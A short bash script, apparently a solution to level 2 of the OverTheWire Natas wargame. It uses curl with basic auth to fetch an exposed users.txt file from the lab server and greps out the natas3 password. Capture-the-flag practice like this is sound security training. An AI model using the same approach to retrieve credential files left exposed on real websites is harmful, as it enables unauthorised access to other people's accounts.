#!/bin/bash

natas=natas2
key=$(< keys/dois)
uri="http://$natas.natas.labs.overthewire.org/files/users.txt"
opts=""
filter=natas3

curl -u $natas:$key $opts $uri 2> /dev/null | grep $filter

